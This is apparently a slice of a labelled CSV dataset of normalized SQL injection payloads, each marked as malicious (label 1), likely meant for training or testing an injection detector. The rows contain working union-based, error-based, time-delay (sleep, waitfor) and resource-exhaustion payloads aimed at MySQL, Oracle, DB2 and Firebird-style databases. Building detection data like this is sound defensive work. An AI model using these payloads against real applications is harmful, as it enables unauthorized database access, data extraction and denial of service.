row_index,payload_norm,label,sqli_type_hint
8310,-5039 union all select 2114#,1,
8311,"1"" ) ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""yopd"" like ""yopd",1,
8312,"1'|| ( select 'jfxs' from dual where 5485 = 5485 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
8313,"1%' ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8314,"1%"" ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( ""%"" = """,1,
8315,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ""hxdd"" = ""hxdd",1,
8316,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) # aetd",1,
8317,-1879%' ) ) or 3038 = 3038,1,
8318,1%' ) ) waitfor delay '0:0:5' and ( ( '%' = ',1,
8319,select ( case when ( 8663 = 7467 ) then 8663 else 1/ ( select 0 ) end ) --,1,
8320,"1"" ) as dezr where 2145 = 2145 or sleep ( 5 ) #",1,
8321,1'+ ( select emeu where 2310 = 2310,1,
8322,"1' ) as tuhc where 4018 = 4018 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
8323,"1 ) ) ) union all select null,null,null#",1,
8324,"1' where 8430 = 8430 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
8325,"1 ) ) ) union all select null,null,null,null,null,null,null,null,null,null#",1,
8326,"1 ) and elt ( 4249 = 4249,7259 )",1,
8327,"1%' union all select null,null,null,null#",1,
8328,"-9098' union all select 3476,3476,3476,3476,3476,3476#",1,
8329,1'+ ( select nxfp where 5006 = 5006,1,
8330,"-7083 union all select 7705,7705,7705,7705,7705#",1,
8331,1' ) and 2006 = 2006,1,
8332,select ( case when ( 9986 = 8342 ) then 9986 else 9986* ( select 9986 from information_schema.character_sets ) end ) #,1,
8333,"1"" ) ) as ngvf where 9912 = 9912 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8334,"1%"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""%"" = """,1,
8335,"1' ) where 2725 = 2725 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
8336,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
8337,"1%"" waitfor delay '0:0:5'--",1,
8338,-6412%' or 4065 = 5815 and '%' = ',1,
8339,"1%"" ) ) ) union all select null,null--",1,
